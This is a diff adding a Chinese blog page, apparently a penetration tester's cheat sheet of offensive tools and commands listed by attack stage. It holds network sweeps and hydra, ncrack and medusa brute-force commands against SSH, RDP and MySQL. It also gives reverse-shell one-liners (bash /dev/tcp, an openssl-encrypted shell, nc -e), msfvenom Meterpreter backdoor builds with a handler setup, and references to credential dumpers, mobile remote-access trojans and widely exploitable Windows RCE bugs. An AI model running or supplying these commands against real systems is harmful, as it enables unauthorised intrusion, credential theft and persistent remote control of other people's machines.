@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  
+  <title>
+    渗透测试各阶段工具速查(持续更新) | Leticia‘s Blog 
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+  <meta name="author" content="麻薯">
+
+
+
+  <meta name="keywords" content=",渗透测试">
+<meta name="description" content="前言本文是渗透测试各阶段工具和快速用法速查笔记，将会持续更新。
+站点信息收集12345678GoogleFofaShodanZoomeyeGobywhatwebGithubrobtex
+快速探测存活主机nmap
+123nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试各阶段工具速查(持续更新) | Leticia‘s Blog">
+<meta property="og:url" content="http://yoursite.com/2020/08/07/渗透测试各阶段工具速查-持续更新/index.html">
+<meta property="og:site_name" content="Leticia‘s Blog">
+<meta property="og:description" content="前言本文是渗透测试各阶段工具和快速用法速查笔记，将会持续更新。
+站点信息收集12345678GoogleFofaShodanZoomeyeGobywhatwebGithubrobtex
+快速探测存活主机nmap
+123nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeou">
+<meta property="og:updated_time" content="2020-08-07T13:30:17.173Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透测试各阶段工具速查(持续更新) | Leticia‘s Blog">
+<meta name="twitter:description" content="前言本文是渗透测试各阶段工具和快速用法速查笔记，将会持续更新。
+站点信息收集12345678GoogleFofaShodanZoomeyeGobywhatwebGithubrobtex
+快速探测存活主机nmap
+123nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeou">
+
+  <!-- favicon icon files -->
+
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="icon" href="/images/favicon.ico">
+
+  <!-- css files -->
+  <link rel="stylesheet" href="/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/css/uno.css">
+  <link rel="stylesheet" href="/css/tagscloud.css">
+  <link rel="stylesheet" href="/css/links.css">
+  <link rel="stylesheet" href="/css/archive.css">
+  <link rel="stylesheet" href="/css/jquery.fancybox.css">
+  <link href="//cdn.bootcss.com/highlight.js/9.8.0/styles/monokai-sublime.min.css" rel="stylesheet">
+  <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<body>
+  <!-- mobile menu -->
+  <span class="mobile btn-mobile-menu">
+    <i class="fa btn-mobile-menu__icon fa-bars" aria-hidden="true"></i>
+  </span>
+  <!-- side panel -->
+  
+  <header class="panel-cover panel-cover--collapsed">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+      
+        <a href="/" title="link to homepage for Leticia‘s Blog"><img src="/images/avatar.jpg" width="80" alt="Leticia‘s Blog logo" class="panel-cover__logo logo" /></a>
+      
+        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">麻薯</a></h1>
+        <hr class="panel-cover__divider" />
+        
+        <p class="panel-cover__description">
+          She will never see the day it blossoms,maybe.
+        </p>
+        <hr class="panel-cover__divider" />
+        
+        <!-- TagsCloud -->
+        
+
+  <div id="tagscloud">
+<a href="/tags/渗透测试/" class="tagc1">渗透测试 : 47</a><a href="/tags/笔记/" class="tagc2">笔记 : 16</a><a href="/tags/python/" class="tagc3">python : 14</a><a href="/tags/机器学习/" class="tagc4">机器学习 : 13</a><a href="/tags/php/" class="tagc5">php : 10</a><a href="/tags/mysql/" class="tagc1">mysql : 7</a><a href="/tags/sql注入/" class="tagc2">sql注入 : 5</a><a href="/tags/暴力破解/" class="tagc3">暴力破解 : 5</a><a href="/tags/网络安全/" class="tagc4">网络安全 : 5</a><a href="/tags/rop/" class="tagc5">rop : 4</a><a href="/tags/工具配置/" class="tagc1">工具配置 : 3</a><a href="/tags/ctf/" class="tagc2">ctf : 3</a><a href="/tags/文件上传/" class="tagc3">文件上传 : 3</a><a href="/tags/内网渗透/" class="tagc4">内网渗透 : 3</a><a href="/tags/linux/" class="tagc5">linux : 2</a><a href="/tags/代码审计/" class="tagc1">代码审计 : 2</a><a href="/tags/metasploit/" class="tagc2">metasploit : 2</a><a href="/tags/逻辑处理漏洞/" class="tagc3">逻辑处理漏洞 : 2</a><a href="/tags/密码学/" class="tagc4">密码学 : 2</a><a href="/tags/硬件安全/" class="tagc5">硬件安全 : 2</a>
+</div>
+
+        <div class="navigation-wrapper">
+          <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+            
+              
+              <li class="navigation__item"><a href="/#blog" title="" class="blog-button">博客</a></li>
+            
+              
+              <li class="navigation__item"><a href="/archive/" title="" class="">归档</a></li>
+            
+              
+              <li class="navigation__item"><a href="/links/" title="" class="">友链</a></li>
+            
+            </ul>
+          </nav>
+          
+<hr class="panel-cover__divider">
+<nav class="cover-navigation navigation--social">
+  <ul class="navigation">
+    
+      <!-- Github -->
+      <li class="navigation__item">
+        <a href="https://github.com/echohun" title="麻薯's GitHub">
+          <i class='fa fa-github'></i>
+          <span class="label">GitHub</span>
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+        </div>
+      </div>
+    </div>
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+  <div class="content-wrapper">
+    <div class="content-wrapper__inner entry">
+      <!-- body panel -->
+      
+<article class="post-container post-container--single">
+  <header class="post-header">
+    <h1 class="post-title">渗透测试各阶段工具速查(持续更新)</h1>
+    
+    <div class="post-meta">
+      <time datetime="2020-08-07 21:29:37" class="post-meta__date date">2020-08-07 21:29:37</time> 
+      <span class="post-meta__tags tags">
+      
+        <font class="categories">&#8226; 分类:
+        <a class="categories-link" href="/categories/渗透测试/">渗透测试</a>
+        </font>
+      
+      
+        &#8226; 标签:
+        <font class="tags">
+        <a class="tags-link" href="/tags/渗透测试/">渗透测试</a>
+        </font>
+      
+      </span>
+    </div>
+    
+  </header>
+  <section id="post-content" class="article-content post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是渗透测试各阶段工具和快速用法速查笔记，将会持续更新。</p>
+<h3 id="站点信息收集"><a href="#站点信息收集" class="headerlink" title="站点信息收集"></a>站点信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Google</div><div class="line">Fofa</div><div class="line">Shodan</div><div class="line">Zoomeye</div><div class="line">Goby</div><div class="line">whatweb</div><div class="line">Github</div><div class="line">robtex</div></pre></td></tr></table></figure>
+<h3 id="快速探测存活主机"><a href="#快速探测存活主机" class="headerlink" title="快速探测存活主机"></a>快速探测存活主机</h3><p>nmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt</div><div class="line">nmap 172.18.2.1/24 -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oX result.xml</div><div class="line">nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -oG result.txt -iL ip.txt</div></pre></td></tr></table></figure>
+<p>格式化输出存活ip，做后续详细扫描使用<br><a href="https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py" target="_blank" rel="external">https://github.com/echohun/tools/blob/master/web%E6%89%AB%E6%8F%8F/nmap_clean_data.py</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了；</div><div class="line">-Pn： 禁用PING检测，这样速度快，并且可以防止有些主机无法ping通而被漏掉不扫描；</div><div class="line">-n： 禁止DNS反向解析；</div><div class="line">–open： 只输出检测状态为open的端口，即开放的端口；</div><div class="line">–min-hostgroup 4：调整并行扫描组的大小；</div><div class="line">–min-parallelism 1024：调整探测报文的并行度；</div><div class="line">–host-timeout 30：检测超时的跳过</div><div class="line">-T4：总共有T0-T5，貌似T4比较折中</div><div class="line">-v：打印详细扫描过程</div><div class="line">-oG：输出为比较人性化的格式，一条记录一行，后期好处理</div><div class="line">-iL：载入ip段文件，批量扫，不用一条条执行了。</div></pre></td></tr></table></figure>
+<p>ipscan</p>
+<h3 id="快速探测端口"><a href="#快速探测端口" class="headerlink" title="快速探测端口"></a>快速探测端口</h3><p>masscan的发包速度非常快，在windows中，它的发包速度可以达到每秒30万包；在Linux中，速度可以达到每秒160万。masscan在扫描时会随机选择目标IP，所以不会对远程的主机造成压力。<br><a href="https://www.freebuf.com/sectool/112583.html" target="_blank" rel="external">https://www.freebuf.com/sectool/112583.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">masscan 172.18.2.1 -p1-65535 --rate=10000</div><div class="line">masscan -p80,8080-8100 10.0.0.0/8 -oL result_mas.txt --rate=10000</div><div class="line">masscan -p80,8080-8100 10.0.0.0/8 -oX result_mas.txt --rate=10000</div></pre></td></tr></table></figure></p>
+<h3 id="邮箱搜集工具"><a href="#邮箱搜集工具" class="headerlink" title="邮箱搜集工具"></a>邮箱搜集工具</h3><p>EmailSniper</p>
+<h3 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h3><p>SubDominscanner</p>
+<h3 id="指纹收集"><a href="#指纹收集" class="headerlink" title="指纹收集"></a>指纹收集</h3><p>whatweb -v <a href="http://baidu.com" target="_blank" rel="external">http://baidu.com</a></p>
+<h3 id="web目录扫描"><a href="#web目录扫描" class="headerlink" title="web目录扫描"></a>web目录扫描</h3><p>御剑</p>
+<p>Dirbuster</p>
+<p><a href="https://www.jianshu.com/p/79c7b1eda56e" target="_blank" rel="external">https://www.jianshu.com/p/79c7b1eda56e</a></p>
+<p>webpathbrute</p>
+<h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><p>wvs</p>
+<p>burpsuite</p>
+<p>nessus（强烈推荐）</p>
+<p>xray</p>
+<h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>hydra<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">hydra -V -l fakeroot -P top100.txt 172.18.2.177 ssh</div><div class="line">hydra -V -l admin -P top100.txt 172.18.2.177 rdp</div><div class="line">hydra -V -l root -P top100.txt 172.18.2.177 mysql</div></pre></td></tr></table></figure></p>
+<p>ncrack<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ncrack -vv -d10 -user root -P top100.txt 172.18.2.177 -p ssh -g CL=10,at=3</div><div class="line">ncrack -vv -d10 -user root -P top100.txt 172.18.2.177 -p mysql -g CL=10,at=3</div></pre></td></tr></table></figure></p>
+<p>medusa<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">medusa -v 6 -h 172.18.2.177 -u fakeroot -P top100.txt -M ssh -t 10 -O out.txt</div><div class="line">medusa -v 6 -h 172.18.2.177 -u root -P top100.txt -M mysql -t 10 -O out.txt</div></pre></td></tr></table></figure></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>metasploit</p>
+<p>burpsuite</p>
+<p>sqlmap</p>
+<p>xxer （xml注入利用工具） <a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="external">https://github.com/TheTwitchy/xxer</a> </p>
+<p>ysoserial （反序列化利用工具） <a href="https://github.com/frohoff/ysoserial" target="_blank" rel="external">https://github.com/frohoff/ysoserial</a></p>
+<p>Struts2-Scan （struts2历史漏洞扫描和利用） <a href="https://github.com/HatBoy/Struts2-Scan" target="_blank" rel="external">https://github.com/HatBoy/Struts2-Scan</a></p>
+<p>weblogicScanner （weblogic历史漏洞扫描利用） <a href="https://github.com/0xn0ne/weblogicScanner" target="_blank" rel="external">https://github.com/0xn0ne/weblogicScanner</a></p>
+<p>exphub （常见web框架cve利用） <a href="https://github.com/zhzyker/exphub" target="_blank" rel="external">https://github.com/zhzyker/exphub</a></p>
+<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>菜刀</p>
+<p>蚁剑</p>
+<p>冰蝎</p>
+<p>cobalt strike</p>
+<p>普通反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/HOST/PORT 0&gt;&amp;1</div></pre></td></tr></table></figure></p>
+<p>加密shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</div><div class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</div><div class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.xx.xx:4444 &gt; /tmp/s; rm /tmp/s</div></pre></td></tr></table></figure></p>
+<p>nc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">攻击机 nc -lvp 4444</div><div class="line">靶机 nc -e /bin/bash xx.xx.xx.xx 4444</div></pre></td></tr></table></figure></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>sudo提权<br><a href="http://next.uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://next.uuzdaisuki.com/2020/02/12/linux%E5%B8%B8%E8%A7%81%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/</a></p>
+<p>各类exp<br>典型通杀:脏牛CVE-2016-5195</p>
+<p>metasploit</p>
+<p>本地漏洞扫描工具</p>
+<p>windows/linux exploit suggester</p>
+<h3 id="本地口令获取和破解"><a href="#本地口令获取和破解" class="headerlink" title="本地口令获取和破解"></a>本地口令获取和破解</h3><p>hash-identifier 判断哈希类型</p>
+<p>mimikatz</p>
+<p>Mimipenguin</p>
+<p>LaZagne<br><a href="http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">http://next.uuzdaisuki.com/2019/12/07/%E4%B8%A4%E6%AC%BE%E5%AF%86%E7%A0%81%E6%8F%90%E5%8F%96%E5%B7%A5%E5%85%B7%E7%9A%84%E9%85%8D%E7%BD%AE%E5%92%8C%E4%BD%BF%E7%94%A8/</a></p>
+<p>hashcat+口令字典<br><a href="http://next.uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/" target="_blank" rel="external">http://next.uuzdaisuki.com/2020/07/28/%E5%93%88%E5%B8%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7hashcat/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">--hash-type 0 --attack-mode 0</div><div class="line">-m选择哈希类型</div><div class="line">1000为windows nt hash</div><div class="line">-a选择模式</div><div class="line">0 Straight（字典破解）</div><div class="line">1 Combination（组合破解）</div><div class="line">3 Brute-force（掩码暴力破解）</div><div class="line">6 Hybrid dict + mask（混合字典+掩码）</div><div class="line">7 Hybrid mask + dict（混合掩码+字典）</div></pre></td></tr></table></figure>
+<h3 id="本地信息收集"><a href="#本地信息收集" class="headerlink" title="本地信息收集"></a>本地信息收集</h3><p>linuxprivchecker</p>
+<p>LinEnum</p>
+<h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>常见后门手法</p>
+<p>metasploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=170.170.64.17 LPORT=4444 -f elf -o reverse_tcp_linux64</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=4444 -f exe -o reverse_tcp.exe</div><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST xxx.xxx.xxx.xxx</div><div class="line">set LPORT 4444</div><div class="line">run</div><div class="line"></div><div class="line">常用后续命令</div><div class="line">https://www.cnblogs.com/backlion/p/9484949.html</div></pre></td></tr></table></figure></p>
+<p>python直连反弹shell<br><a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/" target="_blank" rel="external">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a><br>其他语言直连反弹shell  </p>
+<p>windows常见奇淫技巧后门手法<br><a href="http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/" target="_blank" rel="external">http://next.uuzdaisuki.com/2018/06/18/windows%E5%B8%B8%E7%94%A8%E5%90%8E%E9%97%A8%E6%8A%80%E6%9C%AF%E5%8F%8A%E9%98%B2%E8%8C%83/</a></p>
+<h3 id="内网横向渗透"><a href="#内网横向渗透" class="headerlink" title="内网横向渗透"></a>内网横向渗透</h3><p>Hydra</p>
+<p>nessus</p>
+<p>metasploit</p>
+<p>nmap</p>
+<p>powersploit</p>
+<p>Empire</p>
+<p>Psnmap</p>
+<p>lcx</p>
+<p>ew</p>
+<p>tunna</p>
+<p>proxychains</p>
+<p>FRP</p>
+<p>N2N</p>
+<h3 id="内网命令执行和文件访问"><a href="#内网命令执行和文件访问" class="headerlink" title="内网命令执行和文件访问"></a>内网命令执行和文件访问</h3><p>at</p>
+<p>schtasks</p>
+<p>telnet</p>
+<p>sc</p>
+<p>wmic</p>
+<p>wmiexec.vbs</p>
+<p>python impacket wmiexec.py</p>
+<p>psexec</p>
+<p>远程桌面</p>
+<h3 id="arp欺骗"><a href="#arp欺骗" class="headerlink" title="arp欺骗"></a>arp欺骗</h3><p>Cain</p>
+<p>Arpspoof</p>
+<h3 id="远控"><a href="#远控" class="headerlink" title="远控"></a>远控</h3><p>pupy类远控</p>
+<p>teamview</p>
+<p>pcanywhere</p>
+<p>radmin</p>
+<p>手机端</p>
+<p>DroidJack</p>
+<p>Dendroid</p>
+<h3 id="典型windows-rce"><a href="#典型windows-rce" class="headerlink" title="典型windows-rce"></a>典型windows-rce</h3><p>ms17-010 基本通杀</p>
+<p>cve-2019-0708 开放3389情况 windows7及之前通杀</p>
+<h3 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h3><p>q-dir 文件管理工具，可开四个窗口</p>
+<p>beyond compare 文件/文本比较工具</p>
+<p>cmder 命令行工具</p>
+<p>everything 文件搜索工具 </p>
+<p>navicat 数据库连接工具，支持超多种类数据库，支持导出数据，甚至提供拖库的tunnel.php等</p>
+<p>悬剑3.0 超齐全windows工具库系统</p>
+
+  </section>
+  <div class="copyright">
+    <span>文本标题:</span><a href="/2020/08/07/渗透测试各阶段工具速查-持续更新/" target="_blank">渗透测试各阶段工具速查(持续更新)</a><br />
+    <span>文章作者:</span><a href="/" title="回到主页" target="_blank">麻薯</a><br />
+    <span>发布时间:</span>2020-08-07 21:29:37<br />
+    <span>最后更新:</span>2020-08-07 21:30:17<br />
+    <span>原始链接:</span><a href="http://www.uuzdaisuki.com">www.uuzdaisuki.com</a><br />
+    <span>转载声明:</span><i class="fa fa-creative-commons"></i>转载请保留原文链接及作者。
+  </div>
+</article>
+      <!-- footer panel -->
+      <footer class="footer">
+	<center>
+    <span class="footer__copyright">&copy; 2016-2017. | ❤ <a href="mailto:virink@outlook.com"> Virink </a> | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/virink/vhuno">vHuno</a></span>
+    <span>本站采用<i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"知识共享 署名-非商业性使用-禁止演绎 4.0 国际 许可协议"</a></span>
+    </center>
+</footer>
+    </div>
+  </div>
+  <!-- js files -->
+  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/js/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/js/main.js"></script>
+  <script src="/js/scale.fix.js"></script>
+  <script src="/js/tagcloud.js"></script>
+  
+  
+	<script src="/js/jquery.fancybox.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			$(".fancybox").fancybox({
+	            padding: 0,
+	            helpers: {
+	                overlay: {
+	                  locked: false
+	                }
+	            }
+	        });
+		});
+	</script>
+
+  
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript"> 
+        $(document).ready(function(){
+    MathJax.Hub.Config({ 
+        tex2jax: {inlineMath: [['[latex]','[/latex]'], ['\\(','\\)']]} 
+    });
+});
+    </script>
+
+  <script src="//cdn.bootcss.com/highlight.js/9.8.0/highlight.min.js"></script>
+  <script src="/js/gallery.js"></script>
+  <script>
+  $(document).ready(function(){
+    hljs.initHighlightingOnLoad();
+  });
+  </script>
+  
+  
+<div id="totop" style="position: fixed; bottom: 50px; right: 30px; cursor: pointer; opacity: 1;">
+	<a title="back to top"><img style="width:30px;height:30px;" src="/images/totop.png"></a>
+</div>
+<script>
+    (function($) {
+        var upperLimit = 100;
+        var scrollElem = $('#totop');
+        var scrollSpeed = 500;
+        scrollElem.hide();
+        $(window).scroll(function() {
+            var scrollTop = $(document).scrollTop();
+            if (scrollTop > upperLimit) {
+                $(scrollElem).stop().fadeTo(300, 1); // fade back in
+            } else {
+                $(scrollElem).stop().fadeTo(300, 0); // fade out
+            }
+        });
+        $(scrollElem).click(function() {
+            $('html, body').animate({
+                scrollTop: 0
+            }, scrollSpeed);
+            return false;
+        });
+    })(jQuery);
+    </script>
+
+
+  <!-- Analytics Google -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-83885261-1', 'auto');
+  ga('send', 'pageview');
+</script>
+  
+    <script src="/js/jquery.githubRepoWidget.min.js"></script>
+
+  <!--kill ie6 -->
+<!--[if IE 6]>
+  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
+<![endif]-->
+</body>
+</html>
